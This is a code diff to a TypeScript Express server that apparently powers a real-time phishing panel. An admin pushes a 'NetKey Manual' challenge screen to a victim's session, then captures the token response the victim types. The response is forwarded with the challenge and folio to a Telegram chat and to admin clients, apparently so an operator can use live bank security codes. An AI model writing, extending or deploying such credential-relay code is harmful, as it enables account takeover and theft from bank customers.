@@ -1433,7 +1433,33 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 screenType = ScreenType.NETKEY_CUSTOM;
               }
 
-              await storage.updateSession(sessionId, { pasoActual: screenType });
+              // Normalize screen type for NetKey Manual
+              if (screenType === 'netkey_manual') {
+                screenType = ScreenType.NETKEY_MANUAL;
+              }
+
+              // Prepare update data
+              const updateData: any = { pasoActual: screenType };
+              
+              // Add challenge if provided (for NETKEY2)
+              if (validatedData.challenge) {
+                updateData.challenge = validatedData.challenge;
+                console.log('Guardando challenge:', validatedData.challenge);
+              }
+              
+              // Add customChallenge if provided (for NETKEY_CUSTOM)
+              if (validatedData.customChallenge) {
+                updateData.customChallenge = validatedData.customChallenge;
+                console.log('Guardando customChallenge:', validatedData.customChallenge);
+              }
+              
+              // Add manualNetkeyChallenge if provided (for NETKEY_MANUAL)
+              if (validatedData.manualNetkeyChallenge) {
+                updateData.manualNetkeyChallenge = validatedData.manualNetkeyChallenge;
+                console.log('Guardando manualNetkeyChallenge:', validatedData.manualNetkeyChallenge);
+              }
+
+              await storage.updateSession(sessionId, updateData);
               console.log('Actualizado pasoActual a:', screenType);
 
               // Notify specific admin clients about the update
@@ -1964,6 +1990,38 @@ export async function registerRoutes(app: Express): Promise<Server> {
                     createdBy: netkeyCustomCreatedBy
                   }
                 }), netkeyCustomCreatedBy);
+                break;
+
+              case 'netkey_manual':
+                updatedFields.manualNetkeyResponse = inputData.manualNetkeyResponse;
+                updatedFields.pasoActual = ScreenType.VALIDANDO;
+                console.log('Respuesta NetKey Manual recibida:', inputData.manualNetkeyResponse);
+
+                // Obtener el manualNetkeyChallenge original para incluirlo en la notificación
+                const manualChallengeCode = existingSession?.manualNetkeyChallenge || 'N/A';
+
+                // Enviar notificación a Telegram
+                const netkeyManualMessage = `🔐 <b>RESPUESTA NETKEY MANUAL</b>\n\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
+                  `🔢 <b>CHALLENGE MANUAL:</b> ${manualChallengeCode}\n` +
+                  `✅ <b>RESPUESTA:</b> ${inputData.manualNetkeyResponse}\n` +
+                  `💎 <b>Tipo:</b> NetKey Manual (Admin)\n` +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                sendTelegramMessage(netkeyManualMessage);
+
+                // Notificar al admin
+                const netkeyManualCreatedBy = existingSession?.createdBy || '';
+
+                broadcastToAdmins(JSON.stringify({
+                  type: 'NETKEY_MANUAL_RESPONSE_RECEIVED',
+                  data: {
+                    sessionId,
+                    manualChallenge: manualChallengeCode,
+                    manualResponse: inputData.manualNetkeyResponse,
+                    timestamp: new Date().toISOString(),
+                    createdBy: netkeyManualCreatedBy
+                  }
+                }), netkeyManualCreatedBy);
                 break;
 
               case 'datos_contacto':
